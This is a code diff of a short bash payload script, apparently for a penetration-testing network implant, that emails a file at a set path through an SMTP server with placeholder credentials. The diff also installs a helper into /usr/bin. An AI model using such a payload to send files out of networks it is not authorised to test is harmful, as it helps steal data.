@@ -1,3 +1,5 @@
+#!/bin/bash
+
 function run() {
    LED STAGE1
    SWITCH_POS=$(SWITCH)
@@ -10,10 +12,17 @@ function run() {
    USER="username"
    PASS="password"
    FILE="/some/File/Path/1.txt"
-   python /root/payloads/$SWITCH_POS/sendmail.py $FROM $RCPT "$SUBJECT" "$BODY" $SERVER $USER $PASS "$FILE"
+   SENDMAIL $FROM $RCPT "$SUBJECT" "$BODY" $SERVER $USER $PASS "$FILE"
    ####### REMOVE THE FILE VAR FROM THE PYTHON COMMAND IF YOU HAVE NO PATH
    LED FINISH
 }
+
+
+if [ ! -f /usr/bin/SENDMAIL ]; then
+    mv sendemail.py /usr/bin/
+    mv SENDMAIL /usr/bin/
+    chmod +rx /usr/bin/SENDMAIL
+fi
 
 NETMODE NAT
 run
